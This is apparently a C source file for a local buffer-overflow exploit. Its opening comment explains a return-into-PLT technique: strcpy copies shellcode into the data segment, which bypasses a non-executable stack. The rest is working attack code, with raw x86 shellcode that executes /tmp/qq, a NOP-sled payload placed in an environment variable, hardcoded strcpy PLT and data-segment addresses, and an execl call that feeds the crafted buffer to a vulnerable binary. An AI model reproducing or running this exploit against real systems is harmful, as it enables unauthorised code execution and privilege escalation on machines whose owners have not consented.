/* The idea is to return into PLT funxtion not directly into shared library code
 in our case we are using strcpy

 strcpy is the address entry in PLT
 dest  Any address in data segmet
 src points to our env variable or argv where our shellcode will be executed

 Note:: our stack is non executable witg solars non-exec patch

 we overwrite the stack return address witg strcpy field

 strcpy(dst, src);

 strcpy will copy shellcode into dst
 strcpy retun address will point to dst then control will be taken from there

 This is a local exploit not remote

  strcpy |  Dst |  Dst. |  Src


 Bypassing nonexec stack protection

*/


#include <stdio.h>


#define OFFSET 0
#define BUFFER_SIZE 370
#define EGGSIZE 2048
#define NOP 0x90


/* any address in data segment */
#define DEST                            0x08223038
/* strcpy linkage table entry */
#define STRCPY                          0x08066a18

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/tmp/qq";


char buf[BUFFER_SIZE];
char egg[EGGSIZE];
char pattern[16];


int main(int argc, char **argv) {

 /* change your alignment accordinly */

 int i, align = 4; /* try 3-18 */

  int src = (int)&src - OFFSET;   /* getsp();  */

/* Check if theres arg to contorl alignment */

  if(argc ==2)
       align = atoi(argv[1]);


/* Fill in our pattern with address used */

  *(int *)pattern = STRCPY;
  *(int *)(pattern + 4) = DEST;
  *(int *)(pattern + 8) = DEST;
  *(int *)(pattern + 12) = src;

 /* check if pattern[16] isnt filled with our pattern */

 for(int i = 0; i <= 15; i++)
    if(pattern[i] == 0) {
     printf("Zeros in pattern (%i)\n", i);
     exit(1);
}


/* Setting buffer in data segment */

memset(buf, ' ', BUFFER_SIZE);
buf[BUFFER_SIZE - 1] = 0;
buf[0] = ':';
buf[9] = '9';

/* Fill buffer with pattern starts from align length on 16bytes */

for(int i = align; i < BUFFER_SIZE - 16; i += 16)
   memcpy(buf + i, pattern, 16);

/* Setting NOP 0x90 into egg buffer which goes to env variable */
 memset(egg, NOP, EGGSIZE);

/* Copy shellcode into egg env variable */
strcpy(egg + EGGSIZE - strlen(shellcode) -2, shellcode);

strncpy(egg, "EGG=4", 4);
/* put env into env variable */
putenv(egg);

/* Now execute the vulnerable binary to confirm our test */
execl("/path/to/binary", "X", buf, "-nolock", 0);

perror("execl");

}
